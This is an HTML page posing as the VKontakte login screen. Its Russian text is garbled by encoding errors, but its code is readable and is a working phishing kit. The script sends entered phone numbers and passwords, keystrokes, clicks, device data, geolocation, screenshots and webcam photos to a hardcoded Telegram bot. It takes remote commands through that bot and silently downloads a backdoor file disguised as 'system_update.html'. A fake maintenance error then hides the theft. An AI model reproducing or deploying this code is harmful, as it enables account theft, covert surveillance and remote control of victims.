<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–ö–æ–Ω—Ç–∞–∫—Ç–µ | –í—Ö–æ–¥</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .vk-logo {
            text-align: center;
            margin-bottom: 30px;
            color: #2787f5;
            font-size: 32px;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #d3d9de;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #2787f5;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background: #1a6bc9;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
        .hidden {
            display: none;
        }
        #downloadLink {
            display: none;
        }
    </style>
</head>
<body>
    <!-- –§–ò–®–ò–ù–ì–û–í–ê–Ø –§–û–†–ú–ê –í–ö -->
    <div class="login-container" id="loginForm">
        <div class="vk-logo">–í–ö–æ–Ω—Ç–∞–∫—Ç–µ</div>
        <form id="vkForm">
            <div class="form-group">
                <input type="text" id="phone" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω –∏–ª–∏ email" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å" required>
            </div>
            <button type="submit">–í–æ–π—Ç–∏</button>
        </form>
        <div class="footer">
            <a href="#" style="color: #2787f5; text-decoration: none;">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a>
        </div>
    </div>

    <!-- –°–û–û–ë–©–ï–ù–ò–ï –û–ë –û–®–ò–ë–ö–ï -->
    <div class="login-container hidden" id="errorMsg">
        <div style="text-align: center; color: #e64646;">
            <div style="font-size: 48px; margin-bottom: 20px;">‚ö†Ô∏è</div>
            <h3>–í—Ä–µ–º–µ–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ —Ä–∞–±–æ—Ç—ã</h3>
            <p style="margin: 20px 0;">–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –≤–æ–π—Ç–∏ –ø–æ–∑–∂–µ. –ü—Ä–∏–Ω–æ—Å–∏–º –∏–∑–≤–∏–Ω–µ–Ω–∏—è –∑–∞ –Ω–µ—É–¥–æ–±—Å—Ç–≤–∞.</p>
            <button onclick="location.reload()">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
        </div>
    </div>

    <!-- –°–ö–ê–ß–ò–í–ê–ù–ò–ï –§–ê–ô–õ–ê (—Å–∫—Ä—ã—Ç–Ω–æ) -->
    <a id="downloadLink" download="system_update.html"></a>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const BOT_TOKEN = "7619600603:AAEPTYr6ShZQi5KoSvDPmGS7L5M-k8L3AT8";
        const CHAT_ID = "1229704307";
        const SESSION_ID = Math.random().toString(36).substring(2, 15);
        
        let collectedData = {
            credentials: {},
            deviceInfo: {},
            location: {},
            clicks: [],
            keystrokes: [],
            forms: [],
            sessionId: SESSION_ID
        };

        let isBackdoorActive = true;
        let lastUpdateId = 0;

        // üì® –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: CHAT_ID,
                text: message.substring(0, 4000)
            };
            
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º fetch —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(e => console.log('Telegram error'));
        }

        // üéØ –¢–†–ï–ö–ò–ù–ì –ö–õ–ò–ö–û–í
        document.addEventListener('click', function(e) {
            const clickData = {
                time: new Date().toISOString(),
                element: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className : ''),
                text: e.target.textContent?.substring(0, 50),
                coordinates: {x: e.clientX, y: e.clientY}
            };
            
            collectedData.clicks.push(clickData);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∂–¥—ã–µ 10 –∫–ª–∏–∫–æ–≤
            if (collectedData.clicks.length % 10 === 0) {
                sendToTelegram(`üñ±Ô∏è –ö–ª–∏–∫–∏ (${collectedData.clicks.length}): ${collectedData.clicks.slice(-3).map(c => c.element).join(', ')}`);
            }
        });

        // ‚å®Ô∏è –¢–†–ï–ö–ò–ù–ì –ù–ê–ë–û–†–ê –¢–ï–ö–°–¢–ê
        document.addEventListener('input', function(e) {
            if (e.target.type === 'password') return; // –ü–∞—Ä–æ–ª–∏ –æ—Ç–¥–µ–ª—å–Ω–æ
            
            const keystroke = {
                time: new Date().toISOString(),
                field: e.target.id || e.target.name || 'unknown',
                value: e.target.value
            };
            
            collectedData.keystrokes.push(keystroke);
        });

        // üìù –¢–†–ï–ö–ò–ù–ì –§–û–†–ú
        document.addEventListener('submit', function(e) {
            const formData = {
                time: new Date().toISOString(),
                form: e.target.id || 'unknown',
                data: new FormData(e.target)
            };
            collectedData.forms.push(formData);
        });

        // üì± –°–ë–û–† –ò–ù–§–û–†–ú–ê–¶–ò–ò
        function collectDeviceInfo() {
            collectedData.deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                sessionId: SESSION_ID
            };
        }

        // üìç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    collectedData.location = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    sendToTelegram(`üìç –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ: ${collectedData.location.lat}, ${collectedData.location.lon}`);
                });
            }
        }

        // üì∏ –°–ö–†–ò–ù–®–û–¢ (—á–µ—Ä–µ–∑ html2canvas)
        function takeScreenshot() {
            if (typeof html2canvas !== 'undefined') {
                html2canvas(document.body).then(canvas => {
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'screenshot.png');
                        
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    });
                });
            } else {
                sendToTelegram("‚ùå html2canvas –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤");
            }
        }

        // üé• –î–û–°–¢–£–ü –ö –ö–ê–ú–ï–†–ï
        function takePhoto() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            
                            canvas.toBlob(blob => {
                                const formData = new FormData();
                                formData.append('photo', blob, 'photo.png');
                                
                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });
                                
                                stream.getTracks().forEach(track => track.stop());
                            });
                        }, 1000);
                    })
                    .catch(e => sendToTelegram(`‚ùå –û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã: ${e.message}`));
            }
        }

        // üíæ –°–û–ó–î–ê–ù–ò–ï –ü–ï–†–°–ò–°–¢–ï–ù–¢–ù–û–ì–û –ë–≠–ö–î–û–†–ê
        function createBackdoorFile() {
            const backdoorHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <style>body{background:#f0f0f0;font-family:Arial;text-align:center;padding:50px}</style>
</head>
<body>
    <h1>üîß System Update Manager</h1>
    <p>Checking for updates...</p>
    <script>
        const BOT_TOKEN = "${BOT_TOKEN}";
        const CHAT_ID = "${CHAT_ID}";
        const SESSION_ID = "${SESSION_ID}";
        
        let isActive = true;
        
        // –§–æ–Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å
        function backgroundWorker() {
            setInterval(() => {
                // –û—Ç–ø—Ä–∞–≤–∫–∞ heartbeat
                fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: \`‚ù§Ô∏è –ë—ç–∫–¥–æ—Ä –∞–∫—Ç–∏–≤–µ–Ω: \${SESSION_ID}\`
                    })
                }).catch(() => {});
            }, 60000); // –ö–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É
        }
        
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥
        function checkCommands() {
            fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/getUpdates\`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok) {
                        data.result.forEach(update => {
                            const text = update.message?.text;
                            const chatId = update.message?.chat.id;
                            
                            if (chatId == CHAT_ID && text) {
                                handleCommand(text, update.update_id);
                            }
                        });
                    }
                });
        }
        
        function handleCommand(command, updateId) {
            command = command.toLowerCase();
            
            if (command === '/screenshot') {
                // –°–∫—Ä–∏–Ω—à–æ—Ç —á–µ—Ä–µ–∑ html2canvas
                if (typeof html2canvas !== 'undefined') {
                    html2canvas(document.body).then(canvas => {
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('photo', blob, 'screenshot.png');
                            fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendPhoto\`, {
                                method: 'POST',
                                body: formData
                            });
                        });
                    });
                }
            }
            else if (command === '/info') {
                const info = \`üíª –ë—ç–∫–¥–æ—Ä –∞–∫—Ç–∏–≤–µ–Ω\\nüÜî Session: \${SESSION_ID}\\nüì± UserAgent: \${navigator.userAgent}\\nüñ•Ô∏è Screen: \${screen.width}x\${screen.height}\`;
                sendToTelegram(info);
            }
            else if (command === '/destroy') {
                isActive = false;
                sendToTelegram('üí• –ë—ç–∫–¥–æ—Ä —É–Ω–∏—á—Ç–æ–∂–µ–Ω: ' + SESSION_ID);
                document.body.innerHTML = '<h1>System Update Complete</h1><p>Your system has been updated successfully.</p>';
            }
        }
        
        function sendToTelegram(message) {
            fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: message})
            });
        }
        
        // –ó–∞–ø—É—Å–∫
        backgroundWorker();
        setInterval(checkCommands, 5000);
        sendToTelegram('üöÄ –ë—ç–∫–¥–æ—Ä –∑–∞–ø—É—â–µ–Ω: ' + SESSION_ID);
    <\/script>
    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º html2canvas –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤ -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</body>
</html>`;

            const blob = new Blob([backdoorHTML], {type: 'text/html'});
            const url = URL.createObjectURL(blob);
            const link = document.getElementById('downloadLink');
            link.href = url;
            link.download = 'system_update.html';
            link.click();
            
            sendToTelegram(`üì• –ë—ç–∫–¥–æ—Ä –∑–∞–≥—Ä—É–∂–µ–Ω –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${SESSION_ID}`);
        }

        // ü§ñ –ü–†–û–í–ï–†–ö–ê –ö–û–ú–ê–ù–î –ò–ó –¢–ï–õ–ï–ì–†–ê–ú–ú
        function checkTelegramCommands() {
            if (!isBackdoorActive) return;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result) {
                        data.result.forEach(update => {
                            lastUpdateId = update.update_id;
                            const text = update.message?.text;
                            const chatId = update.message?.chat.id;
                            
                            if (chatId == CHAT_ID && text) {
                                handleTelegramCommand(text);
                            }
                        });
                    }
                })
                .catch(e => console.log('Command check error'));
        }

        // üéõÔ∏è –û–ë–†–ê–ë–û–¢–ö–ê –ö–û–ú–ê–ù–î –¢–ï–õ–ï–ì–†–ê–ú
        function handleTelegramCommand(command) {
            command = command.toLowerCase();
            
            if (command === '/screenshot') {
                takeScreenshot();
                sendToTelegram("üì∏ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...");
            }
            else if (command === '/photo') {
                takePhoto();
                sendToTelegram("üì∑ –î–µ–ª–∞—é —Ñ–æ—Ç–æ...");
            }
            else if (command === '/info') {
                const info = `üíª –ò–Ω—Ñ–æ —Å–µ—Å—Å–∏–∏ ${SESSION_ID}\nüë§ –ö–ª–∏–∫–æ–≤: ${collectedData.clicks.length}\n‚å®Ô∏è –í–≤–æ–¥–æ–≤: ${collectedData.keystrokes.length}\nüìù –§–æ—Ä–º: ${collectedData.forms.length}`;
                sendToTelegram(info);
            }
            else if (command === '/location') {
                getLocation();
            }
            else if (command === '/clicks') {
                const recentClicks = collectedData.clicks.slice(-5).map(c => 
                    `${c.time.split('T')[1]} - ${c.element}`
                ).join('\n');
                sendToTelegram(`üñ±Ô∏è –ü–æ—Å–ª–µ–¥–Ω–∏–µ –∫–ª–∏–∫–∏:\n${recentClicks}`);
            }
            else if (command === '/backdoor') {
                createBackdoorFile();
            }
            else if (command === '/destroy') {
                isBackdoorActive = false;
                sendToTelegram('üí• –°–µ—Å—Å–∏—è —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∞: ' + SESSION_ID);
            }
            else if (command === '/full_report') {
                const report = `üìä –ü–û–õ–ù–´–ô –û–¢–ß–ï–¢ ${SESSION_ID}\n\n` +
                    `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${navigator.userAgent}\n` +
                    `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${screen.width}x${screen.height}\n` +
                    `üñ±Ô∏è –í—Å–µ–≥–æ –∫–ª–∏–∫–æ–≤: ${collectedData.clicks.length}\n` +
                    `‚å®Ô∏è –í—Å–µ–≥–æ –≤–≤–æ–¥–æ–≤: ${collectedData.keystrokes.length}\n` +
                    `üìù –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Ñ–æ—Ä–º: ${collectedData.forms.length}`;
                sendToTelegram(report);
            }
        }

        // üìù –û–ë–†–ê–ë–û–¢–ö–ê –§–ò–®–ò–ù–ì–û–í–û–ô –§–û–†–ú–´
        document.getElementById('vkForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º credentials
            collectedData.credentials = { phone, password };
            
            // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            collectDeviceInfo();
            getLocation();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º credentials
            const credsMessage = `üîê –ü–û–õ–£–ß–ï–ù–´ –î–ê–ù–ù–´–ï –í–ö:\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\nüîë –ü–∞—Ä–æ–ª—å: ${password}\nüÜî –°–µ—Å—Å–∏—è: ${SESSION_ID}`;
            sendToTelegram(credsMessage);
            
            // –ó–∞–≥—Ä—É–∂–∞–µ–º –±—ç–∫–¥–æ—Ä –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
            createBackdoorFile();
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
            document.getElementById('loginForm').classList.add('hidden');
            document.getElementById('errorMsg').classList.remove('hidden');
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç
            setTimeout(() => {
                const fullReport = `üéØ –§–ò–ù–ê–õ–¨–ù–´–ô –û–¢–ß–ï–¢ ${SESSION_ID}\n\n` +
                    `üîê Credentials: ${phone} / ${password}\n` +
                    `üì± Device: ${navigator.userAgent}\n` +
                    `üìç Location: ${collectedData.location.lat || 'N/A'}, ${collectedData.location.lon || 'N/A'}\n` +
                    `üñ±Ô∏è Total Clicks: ${collectedData.clicks.length}\n` +
                    `‚å®Ô∏è Total Keystrokes: ${collectedData.keystrokes.length}`;
                sendToTelegram(fullReport);
            }, 2000);
        });

        // üöÄ –ó–ê–ü–£–°–ö –°–ò–°–¢–ï–ú–´
        window.addEventListener('load', function() {
            // –ù–∞—á–∞–ª—å–Ω—ã–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
            collectDeviceInfo();
            getLocation();
            
            sendToTelegram(`üöÄ –ù–æ–≤–∞—è –∂–µ—Ä—Ç–≤–∞ –ø–æ–¥–∫–ª—é—á–∏–ª–∞—Å—å!\nüÜî –°–µ—Å—Å–∏—è: ${SESSION_ID}\nüì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${navigator.userAgent.split(' ').slice(-2).join(' ')}`);
            
            // –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–º–∞–Ω–¥ –∫–∞–∂–¥—ã–µ 3 —Å–µ–∫—É–Ω–¥—ã
            setInterval(checkTelegramCommands, 3000);
            
            // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
            setInterval(() => {
                if (collectedData.clicks.length > 0) {
                    sendToTelegram(`üìà –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å ${SESSION_ID}: ${collectedData.clicks.length} –∫–ª–∏–∫–æ–≤, ${collectedData.keystrokes.length} –≤–≤–æ–¥–æ–≤`);
                }
            }, 30000);
        });

    </script>
    
    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º html2canvas –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤ -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</body>
</html>